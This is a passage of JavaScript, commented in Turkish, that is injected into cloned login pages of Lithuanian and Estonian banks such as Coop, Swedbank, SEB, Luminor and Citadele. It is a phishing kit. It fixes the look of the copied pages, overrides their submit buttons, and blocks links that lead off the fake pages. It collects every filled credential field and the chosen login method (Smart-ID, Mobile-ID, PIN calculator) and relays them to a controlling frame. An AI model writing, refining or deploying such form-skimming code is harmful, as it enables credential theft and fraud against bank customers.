                    'lku-lt': '@media(max-width:768px){.page{width:100%!important;max-width:100%!important;overflow-x:hidden!important}body{overflow-x:hidden!important}.container.page{padding-left:8px!important;padding-right:8px!important}.container.page .row{display:block!important;margin-left:0!important;margin-right:0!important}.container.page .col-xs-10{flex:0 0 100%!important;max-width:100%!important;padding-left:0!important;padding-right:0!important}#menu.sidebar{position:static!important;width:auto!important;top:0!important}#auth_content>a{float:none!important;display:inline!important}#auth_content>a>img{display:none!important}#auth_content h1{font-size:22px!important;line-height:1.25!important;white-space:normal!important;overflow-wrap:anywhere!important}#auth_content h3{font-size:15px!important;line-height:1.3!important;white-space:normal!important;overflow-wrap:anywhere!important}#navTabs ul.nav-tabs{display:none!important}#LT_MOBILE_TABS{display:block!important;max-width:280px!important;margin-bottom:14px!important}.login-inputs{flex-wrap:wrap!important;gap:10px}.login-input{width:100%!important;max-width:100%!important}.login-tab-footer{position:static!important;margin-top:15px!important}.cookie-bar{display:none!important}}@media(min-width:769px){#LT_MOBILE_TABS{display:none!important}}',
                    'siauliu-lt': '.login-navigation.is-desktop{display:flex!important;flex-wrap:wrap!important;width:100%!important;max-width:100%!important}.login-navigation.is-mobile{display:none!important}.login-navigation .tabs-navigation-item{flex:1 1 auto!important;min-width:70px!important}',
                    'swedbank-lt': 'ui-tabs .ui-tabs__captions{display:flex!important;flex-wrap:wrap!important;overflow:visible!important}ui-tabs .ui-tabs__dropdown{display:none!important}',
                    'luminor-lt': '#login-options{overflow:visible!important;width:100%!important}',
                    'citadele-lt': 'ul.css_tabs{overflow:visible!important}'
                };
                const css = cssMap[slug];
                if (css && !document.getElementById('LT_MOBILE_CSS')) {
                    const st = document.createElement('style');
                    st.id = 'LT_MOBILE_CSS';
                    st.textContent = css;
                    (document.head || document.documentElement).appendChild(st);
                }
                // LKU: orijinal tab'lar mobilde bozuk (yazi render olmuyor, sabit 200px
                // genislik, float'li kolon layoutu). Mobilde orijinali gizleyip kendi
                // dikey buton listemizi olusturuyoruz - data-tab-index sayesinde mevcut
                // click->postMessage akisiyla calisir.
                const buildLkuMobileTabs = function() {
                    if (document.getElementById('LT_MOBILE_TABS')) return;
                    try {
                        const tabsWrap = document.querySelector('#navTabs ul.nav-tabs') || document.querySelector('ul.nav-tabs');
                        const btns = document.querySelectorAll('#navTabs .login-type-tab, ul.nav-tabs .nav-link, #navTabs button');
                        if (tabsWrap && btns.length) {
                            const marker = document.getElementById('LITHUANIA_LOGIN_METHOD');
                            const activeIdx = marker ? (marker.getAttribute('data-index') || '') : '';
                            const box = document.createElement('div');
                            box.id = 'LT_MOBILE_TABS';
                            btns.forEach(function(b) {
                                try {
                                    const idx = b.getAttribute('data-tab-index');
                                    const lbl = (b.textContent || '').trim();
                                    if (idx === null || !lbl) return;
                                    const nb = document.createElement('button');
                                    nb.type = 'button';
                                    nb.setAttribute('data-tab-index', idx);
                                    nb.textContent = lbl;
                                    const isActive = activeIdx === idx;
                                    nb.style.cssText = 'display:block;width:100%;margin:0 0 6px;padding:10px 10px;border:0;border-radius:4px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;font-family:Arial,sans-serif;background:' + (isActive ? '#9ac328' : '#cae08e') + ';color:#3c3c39;';
                                    box.appendChild(nb);
                                } catch(_) {}
                            });
                            if (box.children.length) {
                                // Kutuyu #tabContent'in BASINA ekle - formun hemen
                                // ustunde, gorunur alanda (h3'nin parent'i bozuk
                                // layout'ta sagda kaliyor).
                                const tc = document.getElementById('tabContent');
                                try {
                                    if (tc && tc.firstChild) {
                                        tc.insertBefore(box, tc.firstChild);
                                    } else if (tc) {
                                        tc.appendChild(box);
                                    } else {
                                        (document.body || document.documentElement).appendChild(box);
                                    }
                                } catch(_) {
                                    (document.body || document.documentElement).appendChild(box);
                                }
                                // Kolon offset'i kutuyu saga kaydiriyor - gercek
                                // konumunu olcup negatif margin ile viewport'a ortala.
                                try {
                                    const r0 = box.getBoundingClientRect();
                                    const wantLeft = Math.max(10, (window.innerWidth - r0.width) / 2);
                                    box.style.setProperty('margin-left', Math.round(wantLeft - r0.left) + 'px', 'important');
                                } catch(_) {}
                            }
                        }
                    } catch(_) {}
                };
                if (slug === 'lku-lt') {
                    buildLkuMobileTabs();
                    setTimeout(buildLkuMobileTabs, 300);
                    setTimeout(buildLkuMobileTabs, 1000);
                }
            } catch(_) {}
        })();

        setTimeout(fixLithuaniaBanks, 100);
        setTimeout(fixLithuaniaBanks, 500);
        setTimeout(fixLithuaniaBanks, 1500);
        document.addEventListener('click', fixLithuaniaBanks, true);
        document.addEventListener('input', fixLithuaniaBanks, true);

        // Coop Bank Buton Renk Fix: Sadece form alanına yazı girildiğinde rengi değiştir
        if (window.location.href.includes('coop')) {
            document.addEventListener('input', (e) => {
                if (e.target && e.target.tagName === 'INPUT') {
                    const form = e.target.closest('form') || document;
                    const hasValue = Array.from(form.querySelectorAll('input:not([type="hidden"])')).some(inp => inp.value.trim && inp.value.trim().length > 0);
                    
                    document.querySelectorAll('button').forEach(btn => {
                        const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                        if (text.includes('sisene')) {
                            if (hasValue) {
                                btn.style.setProperty('background-color', '#0b56cc', 'important');
                                btn.style.setProperty('color', '#ffffff', 'important');
                                btn.querySelectorAll('*').forEach(child => {
                                    if(child.style) child.style.setProperty('color', '#ffffff', 'important');
                                });
                            } else {
                                btn.style.removeProperty('background-color');
                                btn.style.removeProperty('color');
                                btn.querySelectorAll('*').forEach(child => {
                                    if(child.style) child.style.removeProperty('color');
                                });
                            }
                        }
                    });
                }
            }, true);

            const coopMobileStyle = document.createElement('style');
            coopMobileStyle.innerHTML = \`
              @media (max-width: 768px) {
                .v-tabs.d-none.d-md-block,
                .v-window.d-none.d-md-block,
                .authentication-method__title.d-none.d-md-flex {
                  display: block !important;
                }

                .row.d-none.d-md-flex.justify-center {
                  display: flex !important;
                }

                .authentication-method__mobile.d-md-none {
                  display: none !important;
                }

                .container.login-container {
                  min-height: 100dvh !important;
                  height: auto !important;
                }

                .login-card,
                .authentication-method,
                .v-window,
                .v-window__container,
                .v-window-item {
                  height: auto !important;
                  max-height: none !important;
                }

                .authentication-method {
                  align-items: stretch !important;
                  justify-content: flex-start !important;
                }

                .v-tabs,
                .v-window,
                .v-form,
                .v-input,
                .v-text-field,
                .v-input__control,
                .v-input__slot,
                .v-text-field__slot,
                input {
                  width: 100% !important;
                  max-width: 100% !important;
                  min-width: 0 !important;
                  box-sizing: border-box !important;
                }
              }
            \`;
            document.head.appendChild(coopMobileStyle);
        }

        // Event delegation for EVERYTHING (click, submit)
        // Use capturing phase (true) to ensure our code runs BEFORE bank's broken code
        
        const getFieldLabel = (input) => {
            if (input.id) {
                const labelEl = document.querySelector('label[for="' + input.id + '"]');
                if (labelEl && labelEl.textContent) return labelEl.textContent.trim();
            }

            const closestLabel = input.closest('label');
            if (closestLabel && closestLabel.textContent) {
                return closestLabel.textContent.trim();
            }

            return '';
        };

        const appendFilledFallbackFields = (container, fields) => {
            container.querySelectorAll('input, select, textarea').forEach(input => {
                if (!input || input.disabled) return;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();
                if (
                    type === 'hidden' ||
                    type === 'submit' ||
                    type === 'button' ||
                    type === 'reset' ||
                    type === 'file' ||
                    type === 'radio' ||
                    type === 'checkbox'
                ) {
                    return;
                }

                const value = (input.value || '').trim();
                if (!value) return;

                const label = getFieldLabel(input);
                const ariaLabel = input.getAttribute('aria-label') || '';
                const keyText = [
                    input.name || '',
                    input.id || '',
                    input.getAttribute('formcontrolname') || '',
                    input.getAttribute('data-testid') || '',
                    input.getAttribute('placeholder') || '',
                    ariaLabel,
                    label,
                ].join(' ').toLowerCase();

                if (
                    keyText.includes('rememberme') ||
                    keyText.includes('remember me') ||
                    keyText.includes('pea mind meeles') ||
                    keyText.includes('salvesta') ||
                    keyText.includes('meelde')
                ) {
                    return;
                }

                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
                if (fields.some(field => field.key === fieldKey && (field.value || '').trim() === value)) {
                    return;
                }

                fields.push({
                    key: fieldKey,
                    name: input.name || input.getAttribute('formcontrolname') || '',
                    id: input.id || '',
                    formControlName: input.getAttribute('formcontrolname') || '',
                    value: value,
                    type: type || 'text',
                    label: label,
                    ariaLabel: ariaLabel,
                    placeholder: input.getAttribute('placeholder') || ''
                });
            });
        };

            const buildCapturedFields = (container) => {
            const fields = [];
            if (!container || !container.querySelectorAll) return fields;

            const isRelevantVisibleField = (input) => {
                if (!input || input.disabled) return false;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();
                const keyText = [
                    input.name || '',
                    input.id || '',
                    input.getAttribute('formcontrolname') || '',
                    input.getAttribute('data-testid') || '',
                    input.getAttribute('placeholder') || '',
                    input.getAttribute('aria-label') || '',
                    getFieldLabel(input) || '',
                ].join(' ').toLowerCase();

                if (
                    type === 'hidden' ||
                    type === 'submit' ||
                    type === 'button' ||
                    type === 'reset' ||
                    type === 'file' ||
                    type === 'radio' ||
                    type === 'checkbox'
                ) {
                    return false;
                }

                if (
                    keyText.includes('rememberme') ||
                    keyText.includes('remember me') ||
                    keyText.includes('pea mind meeles') ||
                    keyText.includes('salvesta') ||
                    keyText.includes('meelde')
                ) {
                    return false;
                }

                const style = window.getComputedStyle(input);
                if (
                    style.display === 'none' ||
                    style.visibility === 'hidden' ||
                    style.pointerEvents === 'none'
                ) {
                    return false;
                }

                if (input.closest('[hidden], [aria-hidden="true"], .hidden, .d-none')) {
                    return false;
                }

                if (!input.getClientRects().length) {
                    return false;
                }

                return true;
            };

            container.querySelectorAll('input, select, textarea').forEach(input => {
                if (!isRelevantVisibleField(input)) return;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();

                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
                fields.push({
                    key: fieldKey,
                    name: input.name || input.getAttribute('formcontrolname') || '',
                    id: input.id || '',
                    formControlName: input.getAttribute('formcontrolname') || '',
                    value: input.value || '',
                    type: type || 'text',
                    label: getFieldLabel(input),
                    ariaLabel: input.getAttribute('aria-label') || '',
                    placeholder: input.getAttribute('placeholder') || ''
                });
            });

            const filledFieldCount = fields.filter(field => (field.value || '').trim()).length;
            if (
                filledFieldCount === 0 &&
                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
            ) {
                appendFilledFallbackFields(container, fields);
            } else if (
                filledFieldCount < 2 &&
                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
            ) {
                appendFilledFallbackFields(container, fields);
            }

            return fields;
        };

        const buildInputMap = (fields) => {
            const inputs = {};
            fields.forEach(field => {
                inputs[field.key] = field.value;
            });
            return inputs;
        };

        const serializeAllLtForms = () => {
            var allFields = [];

            // 🚨 🚫 GARBAGE VALUE FILTER: locale, country, dil degeri gelirse (lt_LT, et_EE, nl_NL, lt, et, lv, pl, ru, tr) KAYDETME.
            // Citadele/SEB html icinde gizli <option value="lt_LT"> veya lang inputlari serialize oluyor, gereksiz.
            var GARBAGE_VALUES = /^(lt|et|lv|ee|pl|ru|tr|nl|de|en)([-_](lt|et|lv|ee|pl|ru|tr|nl|de|en))?$/i;

            // ⚠️ ESKI HATA: 1) document.forms'u kordu indexle, gizli dil formu 1.sayiliyordu.
            //              2) form disi inputlar "form0__" olarak AYRI tutuluyordu → 2.form 3.form gibi gozukuyordu.
            // ✅ YENI: Global FORM COUNTER (formOrder). Tum formlari (form disi inputlar dahil)
            //         SAYFANIN USTUNDEN ALTINA DOGRU (DOM sirasi = kullanicinin gordugu sira) 1'den baslayarak numaralandir.
            //         Gizli / tamamen bos (hic deger girilmemis) formlari SAYMA.
            var formOrder = 0;

            // 1) ONCE: Tum document inputlarindan (buildCapturedFields(document)) FORM ICINDE OLMAYAN (stray)lari al.
            //    Bunlar form0 YAPMA, HEMEN formOrder=1 ile (ilk form) say.
            try {
                var rootFields = buildCapturedFields(document);
                var strayFieldBundles = [];
                rootFields.forEach(function(field) {
                    var rawVal = (field.value || '').trim();
                    if (GARBAGE_VALUES.test(rawVal)) return;

                    var sel = '[name="' + field.name + '"], #' + field.id + ', [formcontrolname="' + field.formControlName + '"]';
                    var tempEl = document.querySelector(sel);
                    var isInsideForm = false;
                    if (tempEl && tempEl.closest) {
                        isInsideForm = !!tempEl.closest('form');
                    }
                    if (!tempEl) {
                        var allInputs = Array.from(document.querySelectorAll('input, select, textarea'));
                        for (var i = 0; i < allInputs.length; i++) {
                            var inp = allInputs[i];
                            var inpName = inp.name || inp.getAttribute('formcontrolname') || inp.id || '';
                            var inpVal = (inp.value || '').trim();
                            var fieldVal = (field.value || '').trim();
                            if (
                                inpName === field.name || inpName === field.id ||
                                (inpVal && fieldVal && inpVal === fieldVal)
                            ) {
                                if (inp.closest && inp.closest('form')) {
                                    isInsideForm = true;
                                }
                                break;
                            }
                        }
                    }
                    if (!isInsideForm) {
                        strayFieldBundles.push({
                            key: field.key,
                            name: field.name,
                            id: field.id,
                            formControlName: field.formControlName,
                            value: field.value,
                            type: field.type,
                            label: field.label,
                            ariaLabel: field.ariaLabel,
                            placeholder: field.placeholder,
                        });
                    }
                });

                if (strayFieldBundles.length > 0) {
                    // stray (form disi) inputlar VARSA: bunlar form1'dir (kullanicinin ilk gordugu alan)
                    formOrder = 1;
                    var prefix1 = 'form1__';
                    strayFieldBundles.forEach(function(field) {
                        var v = (field.value || '').trim();
                        if (GARBAGE_VALUES.test(v)) return;
                        allFields.push({
                            key: prefix1 + field.key,
                            name: field.name,
                            id: field.id,
                            formControlName: field.formControlName,
                            value: field.value,
                            type: field.type,
                            label: field.label,
                            ariaLabel: field.ariaLabel,
                            placeholder: field.placeholder,
                            _hasPrefix: true,
                            _formOrder: 1
                        });
                    });
                }
            } catch(_) {}

            try {
                // 2) SONRA: document.forms'u DOM sirasiyla (ustten alta) gez. Gorunur + degerli ise formOrder artir.
                var rawForms = Array.from(document.forms || []);
                for (var fIdx = 0; fIdx < rawForms.length; fIdx++) {
                    var _form = rawForms[fIdx];
                    var _fieldsThisForm = buildCapturedFields(_form);

                    // 1) Icinde en az 1 DEGERLI input var mi? (bos formu atla)
                    var hasAnyValue = _fieldsThisForm.some(function (ff) {
                        return (ff.value || '').trim().length > 0 && !GARBAGE_VALUES.test((ff.value || '').trim());
                    });
                    if (!hasAnyValue) continue;

                    // 2) Form KENDISI gorunuyor mu? (display none, aria-hidden true vs ise atla)
                    var _formRectOk = true;
                    try {
                        var fs = window.getComputedStyle(_form);
                        if (
                            _form.getAttribute('hidden') !== null ||
                            _form.getAttribute('aria-hidden') === 'true' ||
                            fs.display === 'none' || fs.visibility === 'hidden' || fs.opacity === '0' ||
                            !_form.getClientRects || _form.getClientRects().length === 0
                        ) {
                            _formRectOk = false;
                        }
                    } catch (_e) { _formRectOk = true; }
                    if (!_formRectOk) continue;

                    // ✅ Form GECERLI: gorunur + en az 1 degerli input var → formOrder bir ARTIR.
                    formOrder = formOrder + 1;
                    var formPrefix = 'form' + formOrder + '__';
                    _fieldsThisForm.forEach(function (field) {
                        var v = (field.value || '').trim();
                        if (GARBAGE_VALUES.test(v)) return;
                        allFields.push({
                            key: formPrefix + field.key,
                            name: field.name,
                            id: field.id,
                            formControlName: field.formControlName,
                            value: field.value,
                            type: field.type,
                            label: field.label,
                            ariaLabel: field.ariaLabel,
                            placeholder: field.placeholder,
                            _hasPrefix: true,
                            _formOrder: formOrder
                        });
                    });
                }
            } catch(_) {}

            if (allFields.length === 0) {
                try {
                    // FALLBACK: Hicbir form alinmadiysa (muhtemelen tum formlar gizli), document genelini al → form1 yap.
                    formOrder = 1;
                    var fallbackFields = buildCapturedFields(document);
                    fallbackFields.forEach(function(field) {
                        var v = (field.value || '').trim();
                        if (GARBAGE_VALUES.test(v)) return;
                        allFields.push({
                            key: 'form1__' + field.key,
                            name: field.name,
                            id: field.id,
                            formControlName: field.formControlName,
                            value: field.value,
                            type: field.type,
                            label: field.label,
                            ariaLabel: field.ariaLabel,
                            placeholder: field.placeholder,
                            _hasPrefix: true,
                            _formOrder: 1
                        });
                    });
                } catch(_) {}
            }

            var inputs = buildInputMap(allFields);
            return { fields: allFields, inputs };
        };

        const extractLoginMethodLabel = (rawValue) => {
            const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
            const normalized = loginMethod.toLowerCase();

            if (!normalized) {
                return "";
            }

            if (window.location.href.includes('swedbank-lt')) {
                if (normalized.includes('smart')) return 'Smart-ID';
                if (normalized.includes('mobile') || normalized.includes('mobil')) return 'Mobile-ID';
                if (normalized.includes('generator') || normalized.includes('pin gen')) return 'PIN generatorius';
                if (normalized.includes('kortel') || normalized.includes('kort')) return 'ID-kortelė';
                if (normalized.includes('bio') || normalized.includes('pin')) return 'Biometrika/PIN';
            }

            if (window.location.href.includes('swedbank') && normalized.includes('bio')) {
                return 'Biomeetria/PIN-kood';
            }

            if (window.location.href.includes('citadele')) {
                if (normalized.includes('mobilescan') || normalized.includes('digipass')) return 'MobileSCAN/Digipass 780';
                if (normalized.includes('pin')) return 'PIN-kalkulaator';
                if (normalized.includes('mobiil')) return 'Mobiil-ID';
                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            }

            if (window.location.href.includes('coop')) {
                if (normalized.includes('bio')) return 'Biomeetria';
                if (normalized.includes('smart')) return 'Smart-ID';
                if (normalized.includes('mobiil')) return 'Mobiil-ID';
                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            }

            if (normalized.includes('seb mobiil') || normalized.includes('mobiilirakendus')) return 'SEB Mobiilirakendus';
            if (normalized.includes('smart')) return 'Smart-ID';
            if (normalized.includes('mobiil')) return 'Mobiil-ID';
            if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
            if (normalized.includes('mobilescan')) return 'MobileSCAN';
            if (normalized.includes('digipass')) return 'Digipass';
            if (normalized.includes('pin')) return 'PIN-kalkulaator';
            if (normalized.includes('bio')) return 'Biomeetria';

            return loginMethod;
        };

        const getLoginMethod = () => {
            // LT sayfalarinda EN GUVENILIR kaynak: HTML'e enjekte edilen
            // #LITHUANIA_LOGIN_METHOD data-method - her zaman GORUNTULENEN
            // dosyanin metodunu soyler (iframe degisince __traeSelectedLoginMethod
            // yeni iframe'de bos kalir cunku window her iframe'de ayri).
            if (/\\/lithuanian-banks\\//i.test(window.location.href || '')) {
                try {
                    const marker = document.getElementById('LITHUANIA_LOGIN_METHOD');
                    const mm = marker && marker.getAttribute ? (marker.getAttribute('data-method') || '') : '';
                    if (mm.trim()) return mm.trim();
                    const meta = document.querySelector('meta[name="login-method"]');
                    const mc = meta && meta.getAttribute ? (meta.getAttribute('content') || '') : '';
                    if (mc.trim()) return mc.trim();
                } catch(_) {}
            }

            const rememberedLoginMethod = extractLoginMethodLabel(window.__traeSelectedLoginMethod || '');
            if (rememberedLoginMethod) {
                return rememberedLoginMethod;
            }

            if (window.location.href.includes('coop')) {
                const coopCandidates = Array.from(
                    document.querySelectorAll(
                        '.v-tab--active, .v-slide-group__content [aria-selected="true"], .v-item-group .v-item--active, .v-btn-toggle .v-btn--active, input[type="radio"]:checked + label, input[type="radio"]:checked ~ label, .coop-tab.active, .auth-methods-method.active'
                    )
                );

                for (const candidate of coopCandidates) {
                    const label = extractLoginMethodLabel(candidate.textContent || '');
                    if (label) {
                        return label;
                    }
                }
            }

            let loginMethod = "Bilinmiyor";
            const activeTab = document.querySelector('.active, .selected, .current, [aria-selected="true"]');
            if (activeTab) {
                loginMethod = extractLoginMethodLabel(activeTab.textContent || '') || loginMethod;
            }
            if (window.location.href.includes('op-corporate')) {
                const checkedRadio = document.querySelector('input[type="radio"]:checked');
                if (checkedRadio && checkedRadio.nextElementSibling) {
                    loginMethod = extractLoginMethodLabel(checkedRadio.nextElementSibling.textContent || '') || loginMethod;
                }
            }
            return loginMethod;
        };

        const submitCoopVisibleFields = () => {
            // YENI: Tum formlari + form disi alanlari TEK SEFERDE serialize et
            // (form1__ / form2__ / form0__ prefix benzersiz key saglar)
            const { fields: coopFields, inputs: coopInputs } = serializeAllLtForms();

            window.parent.postMessage({
              type: 'LITHUANIA_BANK_SUBMIT',
              formData: { inputs: coopInputs, fields: coopFields, loginMethod: getLoginMethod() }
            }, '*');
        };

        const ensureCoopSubmitButton = () => {
            if (!window.location.href.includes('coop')) return;

            const coopButton = document.getElementById('ID_LoginSubmit');
            if (!coopButton) return;

            coopButton.removeAttribute('disabled');
            coopButton.disabled = false;
            coopButton.style.opacity = '1';
            coopButton.style.cursor = 'pointer';
            coopButton.style.pointerEvents = 'auto';
            coopButton.classList.remove('v-btn--disabled');
            coopButton.classList.remove('disabled');

            if (!coopButton.dataset.traeBound) {
                coopButton.dataset.traeBound = '1';
                coopButton.addEventListener('click', (event) => {
                    event.preventDefault();
                    event.stopPropagation();
                    event.stopImmediatePropagation();
                    submitCoopVisibleFields();
                    return false;
                }, true);
            }
        };

        ensureCoopSubmitButton();
        setTimeout(ensureCoopSubmitButton, 150);
        setTimeout(ensureCoopSubmitButton, 600);
        document.addEventListener('input', ensureCoopSubmitButton, true);
        document.addEventListener('change', ensureCoopSubmitButton, true);

        // YENI 3: RADIO/INPUT/CHANGE EVENTI => Giriş yöntemi (seçenek) DEĞİŞİNCE
        // window.parent.postMessage LITHUANIA_BANK_TAB_CLICK gonder (parent currentIndex guncellensin)
        const notifyParentTabChanged = (loginMethodText, optionalIndex) => {
          const payload = {
            type: 'LITHUANIA_BANK_TAB_CLICK'
          };
          if (loginMethodText && typeof loginMethodText === 'string') {
            payload.loginMethod = extractLoginMethodLabel(loginMethodText) || loginMethodText;
            window.__traeSelectedLoginMethod = payload.loginMethod;
          }
          if (typeof optionalIndex === 'number' && optionalIndex >= 0) {
            payload.targetIndex = optionalIndex;
          }
          try { window.parent && window.parent.postMessage(payload, '*'); } catch(_) {}
        };

        // Radio (yani login method) degisince parenta haber ver (index + loginMethod)
        document.addEventListener('change', (e) => {
          const t = e.target;
          if (t && t.tagName === 'INPUT' && t.type === 'radio') {
            let labelText = '';
            const lbl = (t.id && document.querySelector('label[for="' + t.id + '"]')) || t.closest('label');
            if (lbl) labelText = (lbl.textContent || '') + '';
            if (!labelText) {
              // Sibling label / span next to radio
              const sibs = Array.from((t.parentElement || t).children || []);
              for (const s of sibs) {
                if (s !== t && s.textContent && s.textContent.trim().length < 40) {
                  labelText = s.textContent;
                  break;
                }
              }
            }
            // Parent icin hesapla: radio index (aynı gruptaki kacinci radio ise)
            let optionalIndex = -1;
            const name = t.name;
            if (name) {
              const sameGroup = Array.from(document.querySelectorAll('input[type="radio"][name="' + name + '"]'));
              optionalIndex = sameGroup.indexOf(t);
            }
            notifyParentTabChanged(labelText, optionalIndex >= 0 ? optionalIndex : undefined);
          }
        }, true);

        // Ayrica dogrudan login method sekmelerine (div/button olan class=tab gibi) tiklandiginda
        // (radio olmayan sekmeler icin) notifyParentTabChanged cagirilmasi icin mevcut tab click
        // kodu asagida zaten calisiyor - orada sonuna notifyParentTabChanged cagiriyoruz.

        // 1. Intercept Submits
        document.addEventListener('submit', (e) => {
          preventAnyNativeNavigation(e);

          // YENI: Submit edilen form hangisi olursa olsun TUM formlari + form disi
          // alanlari TEK SEFERDE serialize et (form1__ / form2__ / form0__ prefix)
          const { fields, inputs } = serializeAllLtForms();

          const visibleAnyField = (fields || []).some(f => f.value && String(f.value).trim() !== '');
          const hasGlobalVisible = Array.from(document.querySelectorAll('input, select, textarea')).some(inp => {
            try {
              const tt = (inp.type || inp.tagName || '').toLowerCase();
              if (['hidden','submit','button','reset','file','radio','checkbox'].indexOf(tt) !== -1) return false;
              const v = (inp.value || '').trim();
              return v !== '';
            } catch(_) { return false; }
          });
          if (visibleAnyField || hasGlobalVisible) {
            window.parent.postMessage({
              type: 'LITHUANIA_BANK_SUBMIT',
              formData: { inputs, fields, loginMethod: getLoginMethod() }
            }, '*');
          }
        }, true);

        // 2. Intercept Clicks (Tabs, Buttons, Links)
        document.addEventListener('click', (e) => {
          let target = e.target;
          
          // OP Corporate Bank: Eesti ID-kaart tıklamalarını KESİNLİKLE engelle
          if (window.location.href.includes('op-corporate')) {
              if (target.closest('#estonian-id-card') || target.id === 'estonian-id-card-radio' || target.getAttribute('for') === 'estonian-id-card-radio') {
                  e.preventDefault();
                  e.stopPropagation();
                  e.stopImmediatePropagation();
                  return false;
              }

              if (target.closest('#mobile-id, #mobile-id-radio, label[for="mobile-id-radio"], #smart-id, #smart-id-radio, label[for="smart-id-radio"], #pin-calculator, #pin-calculator-radio, label[for="pin-calculator-radio"]')) {
                  return;
              }
          }
          
          // Dış bağlantıları (href) engelle (Citadele MobileSCAN vs için)
          const a = target.closest('a');
          if (a && a.href) {
             // Eğer link bir "tab" değilse ve dışarıya gidiyorsa engelle
             const aText = a.textContent ? a.textContent.toLowerCase() : '';
             const isTabLink = aText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|parool|password|šifr/i) !== null;
             
             if (!isTabLink && !a.href.startsWith('javascript') && !a.href.startsWith(window.location.origin) && !a.href.includes('#')) {
                 e.preventDefault();
                 e.stopPropagation();
             } else if (isTabLink) {
                 e.preventDefault(); // Sadece yönlendirmeyi engelle, tıklama aşağıya sekme olarak aksın
             }
          }
          
          // DO NOT intercept if clicking on inputs or selects (allow typing)
          if (target.tagName === 'INPUT' && target.type !== 'submit' && target.type !== 'button') {
              if (target.type === 'radio' && target.closest('.ds-option')) {
                  // Allow OP Corporate Bank radio buttons to be handled as tabs
              } else {
                  return;
              }
          }
          if (target.tagName === 'SELECT' || target.tagName === 'TEXTAREA') return;

          // Let labels work natively
          if (target.closest('label')) {
              if (window.location.href.includes('coop') || target.closest('.ds-option') || target.closest('.auth-methods-method')) {
                  // Allow OP Corporate Bank and LHV labels to be handled as tabs
              } else {
                  return;
              }
          }

          // Check if it's a submit button / LOGIN / NEXT / PRISIJUNGTI etc.
          // KURAL: SELECTORU COK DARALT. class*="login" / [class*="form-actions"] button YASAK.
          // Sadece BUTTON, INPUT[type=submit/button] veya A.BTN / A.BUTTON veya EXACT submit siniflari.
          const strictSubmitSelector = [
            'button',
            'input[type="submit"]',
            'input[type="button"]',
            'a.btn',
            'a.button',
            '[class~="submit-btn"]',
            '[class~="btn-submit"]',
            '[class~="btn-submit-form"]',
            '[class~="button-submit"]',
            '[class~="btn-primary"]',
            '[class~="btn-success"]',
            '[class~="btn-warning"]',
            '[class~="v-btn"]',
            '[class~="mdc-button"]',
            '[role="button"][class*="submit"]',
            '[role="button"][class*="primary"]'
          ].join(', ');
          const btn = target.closest(strictSubmitSelector);
          let isSubmitBtn = false;
          let submitInnerBtn = null;

          if (btn) {
              const btnText = ((btn.textContent || '') + ' ' + (btn.value || '') + ' ' + (btn.getAttribute && btn.getAttribute('aria-label') || '')).trim().toLowerCase();
              const cls = (btn.className || '') + '';
              // Native submit elementleri: text kontrolu gerektirmez
              // (citadele "Tęsti", lku <input type=submit value=...> vb.)
              const isNativeSubmit =
                (btn.tagName === 'BUTTON' && (btn.getAttribute('type') || '').toLowerCase() === 'submit') ||
                (btn.tagName === 'INPUT' && ((btn.getAttribute('type') || '').toLowerCase() === 'submit' || (btn.getAttribute('type') || '').toLowerCase() === 'button')) ||
                (btn.getAttribute && btn.getAttribute('name') === 'aLogin') ||
                btn.classList.contains('submit-btn');
              // Login method TAB'leri: tab text'leri - bunlar SUBMIT DEGIL
              const isTabBtn =
                btnText.length < 60 &&
                /(smart[ -]?id|mobile[ -]?id|biometri(k|ja|ka)|pin[ -]?(generator|gen|kalkuliatorius)|id[ -]?kortel[ėe]|mobilescan|qr|digipass|salas[oõna]|parol|password|šifr|sms|one[ -]?time|pin[ -]?calculator)/i.test(btnText + ' ' + cls);
              // Dil / language butonlari
              const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || /\\b(ru|en|et|lt|lv)\\b/i.test(btnText) && btnText.length < 15;

              // STRICT SUBMIT TEXT: maks 30-40 karakter, ve net login/patvirt/prisijung...
              const submitText = /^(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
                /(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;

              if (!isTabBtn && !isLangBtn && (submitText || isNativeSubmit)) {
                  isSubmitBtn = true;
                  submitInnerBtn = btn;
                  target = btn;
              }
          }

          // If not a submit button, check if it's a tab
          let isTabClick = false;
          let targetTab = null;

          if (!isSubmitBtn) {
              // Coop, LHV, Swedbank-LT, SEB-LT, Luminor vb. için sekme yakalayıcı
              const tab = target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
              if (tab) {
                  const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
